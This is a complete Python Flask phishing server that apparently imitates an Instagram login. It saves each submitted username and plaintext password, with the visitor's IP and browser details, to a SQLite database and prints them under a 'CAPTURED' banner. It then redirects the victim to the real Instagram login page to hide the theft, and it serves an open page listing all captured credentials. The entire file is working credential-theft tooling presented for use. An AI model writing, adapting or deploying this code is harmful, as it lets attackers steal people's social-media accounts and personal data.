from flask import Flask,request,render_template_string
import sqlite3,hashlib,datetime
from urllib.parse import quote

app=Flask(__name__)

def init_db():
    conn=sqlite3.connect('database.db')
    c=conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS credentials
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  timestamp TEXT,ip_address TEXT,user_agent TEXT,
                  username TEXT,password TEXT,hashed_password TEXT)''')
    conn.commit()
    conn.close()
init_db()

@app.route('/')
def index():
    return render_template_string(open('index.html').read())

@app.route('/login',methods=['POST'])
def login():
    username=request.form.get('username','')
    password=request.form.get('password','')
    ip=request.remote_addr
    user_agent=request.headers.get('User-Agent','')
    timestamp=datetime.datetime.now().isoformat()
    hashed_pw=hashlib.sha256(password.encode()).hexdigest()
    conn=sqlite3.connect('database.db')
    c=conn.cursor()
    c.execute("INSERT INTO credentials (timestamp,ip_address,user_agent,username,password,hashed_password) VALUES (?,?,?,?,?,?)",(timestamp,ip,user_agent,username,password,hashed_pw))
    conn.commit()
    conn.close()
    print(f"\n=== CAPTURED ===\nTime: {timestamp}\nIP: {ip}\nUsername: {username}\nPassword: {password}\n{'='*50}")
    return f'<meta http-equiv="refresh" content="0;url=https://www.instagram.com/accounts/login/"><script>window.location.href="https://www.instagram.com/accounts/login/"</script>'

@app.route('/credentials')
def view_credentials():
    conn=sqlite3.connect('database.db')
    c=conn.cursor()
    c.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
    rows=c.fetchall()
    conn.close()
    html="""<!DOCTYPE html><html><head><title>Credentials</title><style>body{font-family:Arial;margin:40px;}table{border-collapse:collapse;width:100%;}th,td{border:1px solid #ddd;padding:12px;text-align:left;}th{background:#f2f2f2;}</style></head><body><h1>Captured Credentials</h1><table><tr><th>ID</th><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>"""
    for row in rows:html+=f"<tr><td>{row[0]}</td><td>{row[1]}</td><td>{row[2]}</td><td>{row[4]}</td><td>{row[5]}</td></tr>"
    html+="</table><br><a href='/'>Phishing Page</a></body></html>"
    return html

if __name__=='__main__':app.run(host='0.0.0.0',port=80,debug=False)